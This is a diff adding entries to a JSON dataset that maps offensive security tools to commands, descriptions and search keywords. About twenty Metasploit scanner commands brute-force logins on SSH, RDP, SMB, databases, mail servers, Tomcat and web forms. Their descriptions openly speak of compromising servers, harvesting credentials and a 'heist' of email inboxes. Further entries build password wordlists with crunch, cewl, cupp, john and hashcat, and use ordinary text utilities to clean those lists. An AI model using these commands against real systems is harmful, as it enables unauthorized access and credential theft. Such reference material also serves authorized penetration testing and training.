@@ -4950,5 +4950,513 @@
       "output session mirroring",
       "write continuous trace logs"
     ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/http/http_login; set RHOSTS [ip]; set AUTH_URI /protected/; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "brute forces directories or panels protected by http basic authentication popup boxes",
+    "keywords": [
+      "http basic auth msf",
+      "pop up login crack",
+      "brute force web directory",
+      "credentials scanner"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS [ip]; set RPORT 8080; set USERPASS_FILE [userpass_list]; run",
+    "desc": "tests combined user and password lists against an exposed apache tomcat web manager application panel",
+    "keywords": [
+      "tomcat login brute",
+      "port 8080 crack",
+      "manager application exploit",
+      "auxiliary tomcat auth"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/ssh/ssh_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "systematically attempts automated logins across open secure shell terminal daemons on port 22",
+    "keywords": [
+      "ssh brute force metasploit",
+      "port 22 authentication crack",
+      "credential stuffing ssh"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/ftp/ftp_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "tests credential combinations against file transfer services to compromise storage areas",
+    "keywords": [
+      "ftp login brute force",
+      "port 21 attack",
+      "harvest ftp credentials",
+      "file share crack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/telnet/telnet_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "attacks old cleartext telnet remote terminal administration environments on port 23",
+    "keywords": [
+      "telnet brute force msf",
+      "cleartext administration crack",
+      "legacy login hack",
+      "port 23 brute"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/smb/smb_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "brute forces local active directory or windows samba network shares to obtain network validation tokens",
+    "keywords": [
+      "smb login attack",
+      "windows credential stuffing",
+      "samba file share crack",
+      "port 445 brute"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/mysql/mysql_login; set RHOSTS [ip]; set USERNAME root; set PASS_FILE [passwords]; run",
+    "desc": "targets the structural database engine layer directly by forcing administration root combinations",
+    "keywords": [
+      "mysql root brute force",
+      "database layer login attack",
+      "port 3306 credentials break"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/postgres/postgres_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "attacks postgresql database structures via default systems users to gain terminal execution rights",
+    "keywords": [
+      "postgres login crack",
+      "sql engine access brute",
+      "postgresql background database attack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/vnc/vnc_login; set PASS_FILE [passwords]; set RHOSTS [ip]; run",
+    "desc": "checks remote graphical screen shares that do not enforce username checks and only require password strings",
+    "keywords": [
+      "vnc remote desktop brute",
+      "screen sharing password crack",
+      "port 5900 authentication audit"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/snmp/snmp_login; set RHOSTS [ip]; set PASS_FILE [community_strings]; run",
+    "desc": "runs automated dictionary passes against network hardware monitoring engines to discover community names",
+    "keywords": [
+      "snmp community string brute",
+      "network monitoring data exploit",
+      "port 161 security check"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/winrm/winrm_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "targets windows remote system management listener panels running on web communication channels",
+    "keywords": [
+      "winrm login brute",
+      "windows enterprise management exploit",
+      "port 5985 shell crack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/rdp/rdp_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "runs automated password checks against local remote desktop interfaces to capture persistent graphical instances",
+    "keywords": [
+      "rdp protocol brute force",
+      "desktop interface credentials attack",
+      "port 3389 network hack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/pop3/pop3_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "brute forces incoming electronic mail receiver access nodes to compromise corporate email logs",
+    "keywords": [
+      "pop3 mail server brute",
+      "post office protocol crack",
+      "email inbox database heist",
+      "port 110 attack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/imap/imap_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "checks internet message access endpoints to bypass modern corporate webmail boundaries",
+    "keywords": [
+      "imap mail credentials brute",
+      "port 143 mailbox scan",
+      "extract email passwords"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/smtp/smtp_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "attempts authentication attacks directly inside the core network mail relay transfer interfaces",
+    "keywords": [
+      "smtp relay login brute",
+      "email transit authentication crack",
+      "port 25 server attack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/http/http_form_login; set RHOSTS [ip]; set TARGETURI /login.php; set vars USER=^USER^&PASS=^PASS^; set AUTH_VARS \"USER,PASS\"; run",
+    "desc": "configures custom web field variables to mimic real browser human logins and capture app cookies",
+    "keywords": [
+      "universal web form brute",
+      "http post form login msf",
+      "custom dashboard web login crack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/redis/redis_login; set RHOSTS [ip]; set PASS_FILE [passwords]; run",
+    "desc": "tests database cache clusters running in volatile memory arrays for unprotected master passwords",
+    "keywords": [
+      "redis cluster password brute",
+      "memory array authentication exploit",
+      "port 6379 database breach"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/mssql/mssql_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "attacks microsoft enterprise database environments to grab elevated database structural power",
+    "keywords": [
+      "mssql administrator password brute",
+      "corporate relational database exploit",
+      "port 1433 query attack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/mongodb/mongodb_login; set RHOSTS [ip]; set USER_FILE [users]; set PASS_FILE [passwords]; run",
+    "desc": "attacks modern un-structured nosql database objects to dump text storage collections",
+    "keywords": [
+      "mongodb authorization brute",
+      "nosql document store exploit",
+      "port 27017 database audit"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/oracle/oracle_sidbrute; set RHOSTS [ip]; set WORKLIST [sids_list]; run",
+    "desc": "brute forces unique systemic database identifiers required to open data channels on legacy oracle engines",
+    "keywords": [
+      "oracle sid brute force",
+      "relational enterprise system discovery",
+      "port 1521 engine scan"
+    ]
+  },
+  {
+    "tool": "crunch",
+    "command": "crunch 4 6 abcdef -o wordlist.txt",
+    "desc": "generates every possible dictionary combination between 4 and 6 characters using only specific characters",
+    "keywords": [
+      "custom dictionary generator",
+      "character combination builder",
+      "math password generation",
+      "crunch syntax"
+    ]
+  },
+  {
+    "tool": "crunch",
+    "command": "crunch 8 8 -t pass@@%% -o wordlist.txt",
+    "desc": "creates an exact 8-character list where custom characters map to letters (@) and numbers (%) fields",
+    "keywords": [
+      "template pattern password builder",
+      "pattern mask wordlist",
+      "targeted dictionary enforcement"
+    ]
+  },
+  {
+    "tool": "crunch",
+    "command": "crunch 5 5 -p admin password secret",
+    "desc": "takes explicit whole string elements and shuffles them into all possible permutations without changing spelling",
+    "keywords": [
+      "word permutation builder",
+      "text shuffling dictionary",
+      "compound passphrase generator"
+    ]
+  },
+  {
+    "tool": "crunch",
+    "command": "crunch 6 6 -b 20mb -o START",
+    "desc": "cuts massive math wordlist outputs dynamically into smaller 20 megabyte physical storage files automatically",
+    "keywords": [
+      "split dictionary output",
+      "manageable wordlist generation",
+      "storage limit wordlist split"
+    ]
+  },
+  {
+    "tool": "cewl",
+    "command": "cewl http://[ip]/ -d 2 -m 5 -w custom_cewl.txt",
+    "desc": "crawls a web interface up to 2 pages deep and collects words longer than 5 letters to map custom profiles",
+    "keywords": [
+      "target website scaper",
+      "text miner dictionary",
+      "human written keyword extractor",
+      "custom web dictionary"
+    ]
+  },
+  {
+    "tool": "cewl",
+    "command": "cewl http://[ip]/ --offsite -m 6 -w target_extended.txt",
+    "desc": "permits the crawling spider to leave the original host to collect keywords from linked external text resources",
+    "keywords": [
+      "offsite link scraper",
+      "web app reference miner",
+      "broad target profile harvesting"
+    ]
+  },
+  {
+    "tool": "cewl",
+    "command": "cewl http://[ip]/ -c -w count.txt",
+    "desc": "records the webpage terms alongside their mathematical structural recurrence frequency metrics",
+    "keywords": [
+      "password term frequency list",
+      "analytics keyword extractor",
+      "priority list generator"
+    ]
+  },
+  {
+    "tool": "cupp",
+    "command": "cupp -i",
+    "desc": "triggers an interactive automated human target system profiler wizard that asks for names, pet dates, and histories",
+    "keywords": [
+      "personalized password list",
+      "social engineering dictionary builder",
+      "human target profiler"
+    ]
+  },
+  {
+    "tool": "john",
+    "command": "john --wordlist=base.txt --rules --stdout > mutated.txt",
+    "desc": "pipes a baseline wordlist through internal mutation rule engines to generate complex variations (leet-speak, suffixes)",
+    "keywords": [
+      "apply hash rules to text",
+      "password mutation engine",
+      "rule based dictionary expansion"
+    ]
+  },
+  {
+    "tool": "hashcat",
+    "command": "hashcat -a 1 --stdout wordlist1.txt wordlist2.txt > combined.txt",
+    "desc": "takes two separate distinct wordlists and performs cross-multiplication joining to generate double passphrase terms",
+    "keywords": [
+      "combinator attack builder",
+      "word concatenation generator",
+      "compound phrase generator"
+    ]
+  },
+  {
+    "tool": "bash",
+    "command": "sort -u dirty_list.txt > clean_list.txt",
+    "desc": "re-orders any flat dictionary text line alphabetically and eliminates duplicate duplicate terms",
+    "keywords": [
+      "clean duplicate words",
+      "optimize dictionary size",
+      "unique password sorter"
+    ]
+  },
+  {
+    "tool": "awk",
+    "command": "awk 'length($0) >= 8' base.txt > clean8.txt",
+    "desc": "filters structural list paths to preserve only entries that match or exceed modern 8-character corporate minimums",
+    "keywords": [
+      "drop short passwords",
+      "enforce password length limit",
+      "regex filter string sizes"
+    ]
+  },
+  {
+    "tool": "tr",
+    "command": "tr 'A-Z' 'a-z' < caps.txt > lower.txt",
+    "desc": "transforms every single uppercase alpha element inside a text file down into uniform lowercase format",
+    "keywords": [
+      "lowercase converter",
+      "standardize text casing",
+      "remove dictionary caps"
+    ]
+  },
+  {
+    "tool": "tr",
+    "command": "tr 'a-z' 'A-Z' < lower.txt > caps.txt",
+    "desc": "forces all lowercase character strings upward into full absolute caps formats",
+    "keywords": [
+      "uppercase transformer",
+      "capitalize wordlist entries",
+      "dictionary text case editor"
+    ]
+  },
+  {
+    "tool": "grep",
+    "command": "grep -E '^[A-Za-z]+[0-9]+' raw.txt > targeted.txt",
+    "desc": "filters out junk records to isolate strings that lead with alpha terms and terminate with numbers",
+    "keywords": [
+      "extract specific password patterns",
+      "alphanumeric wordlist filtering",
+      "regex text cleaning"
+    ]
+  },
+  {
+    "tool": "wc",
+    "command": "wc -l wordlist.txt",
+    "desc": "counts the absolute number of horizontal lines present inside a target data dictionary",
+    "keywords": [
+      "calculate dictionary size",
+      "count total passwords",
+      "check list line volume"
+    ]
+  },
+  {
+    "tool": "sed",
+    "command": "sed 's/$/2026/' base.txt > appended.txt",
+    "desc": "appends a strict year identifier metric onto the absolute terminal boundary tail of every entry line",
+    "keywords": [
+      "append suffix to wordlist",
+      "add trailing numbers",
+      "batch password updater"
+    ]
+  },
+  {
+    "tool": "sed",
+    "command": "sed 's/^/admin_/' base.txt > prepended.txt",
+    "desc": "prefixes a chosen administrative domain flag onto the lead beginning element of all document strings",
+    "keywords": [
+      "prepend text to passwords",
+      "batch prefix generator",
+      "add leading string tags"
+    ]
+  },
+  {
+    "tool": "sed",
+    "command": "sed -i 's/[^a-zA-Z0-9]//g' wordlist.txt",
+    "desc": "strips out illegal special symbol variables or weird control formatting artifacts inline inside text resources",
+    "keywords": [
+      "strip special characters",
+      "sanitize database dump passwords",
+      "force alphanumeric strings"
+    ]
+  },
+  {
+    "tool": "head",
+    "command": "head -n 1000 massive.txt > top1000.txt",
+    "desc": "slices out the elite highest priority first 1,000 structural rows from a comprehensive dictionary file",
+    "keywords": [
+      "extract top entries",
+      "split high probability passwords",
+      "quick pass list creator"
+    ]
+  },
+  {
+    "tool": "tail",
+    "command": "tail -n 500 massive.txt > bottom500.txt",
+    "desc": "grabs the final trailing 500 rows positioned at the absolute base floor of a document layout",
+    "keywords": [
+      "extract bottom text lines",
+      "pull historical dictionary rows",
+      "slice text bounds"
+    ]
+  },
+  {
+    "tool": "split",
+    "command": "split -l 50000 huge_list.txt small_chunk_",
+    "desc": "chops a colossal wordlist evenly into distinct separate structural physical files containing exactly 50,000 items each",
+    "keywords": [
+      "break down massive dictionaries",
+      "payload splitting automation",
+      "processing size optimization"
+    ]
+  },
+  {
+    "tool": "paste",
+    "command": "paste -d '-' users.txt pass.txt > combo.txt",
+    "desc": "links two individual user and password columns side-by-side separated by a clean custom dash delimiter string",
+    "keywords": [
+      "generate inline credential pairs",
+      "side by side text joining",
+      "user password mapping"
+    ]
+  },
+  {
+    "tool": "comm",
+    "command": "comm -12 <(sort list1.txt) <(sort list2.txt) > shared.txt",
+    "desc": "isolates and prints only the identical shared overlap word entities found in both target source list resources",
+    "keywords": [
+      "find common list items",
+      "duplicate discovery tool",
+      "intersection list filtering"
+    ]
+  },
+  {
+    "tool": "cut",
+    "command": "cut -d '@' -f 1 emails.txt > base_usernames.txt",
+    "desc": "strips away the domain extensions from harvested corporate email lists to isolate clean core tracking usernames",
+    "keywords": [
+      "extract user handles from email",
+      "clean osint user lists",
+      "strip domain text strings"
+    ]
+  },
+  {
+    "tool": "seq",
+    "command": "seq -w 0000 9999 > pin_list.txt",
+    "desc": "builds an absolute mathematical numerical sequence containing full padded zero metrics from 0000 to 9999",
+    "keywords": [
+      "numeric pin generator",
+      "generate 4 digit codes",
+      "pad zero number engine"
+    ]
+  },
+  {
+    "tool": "grep",
+    "command": "grep -v '^[[:space:]]*$' messy.txt > clean.txt",
+    "desc": "scans a file configuration path to purge blank whitespace rows that break execution arguments inside network brute tools",
+    "keywords": [
+      "remove empty list lines",
+      "purge empty whitespaces",
+      "fix dictionary format errors"
+    ]
+  },
+  {
+    "tool": "awk",
+    "command": "awk '!seen[$0]++' duplicated.txt > unique.txt",
+    "desc": "leverages local memory arrays to drop repeating line structures instantly without ruining the file's original text order",
+    "keywords": [
+      "high speed duplicates purge",
+      "fast alternative to sort",
+      "maintain file line layout order"
+    ]
+  },
+  {
+    "tool": "sed",
+    "command": "sed -n '500,1000p' master.txt > targeted_chunk.txt",
+    "desc": "prints and copies a precise range of internal data rows situated exactly between lines 500 and 1000",
+    "keywords": [
+      "extract middle file section",
+      "capture specific row index",
+      "pinpoint text line selection"
+    ]
+  },
+  {
+    "tool": "iconv",
+    "command": "iconv -f ISO-8859-1 -t UTF-8 raw_list.txt -o universal.txt",
+    "desc": "remaps archaic or non-standard file encoding schemes into clean universal standard configurations to ensure absolute terminal tool compatibility",
+    "keywords": [
+      "fix broken wordlist formatting",
+      "encoding layout standardizer",
+      "repair file text crash bugs"
+    ]
   }
 ]
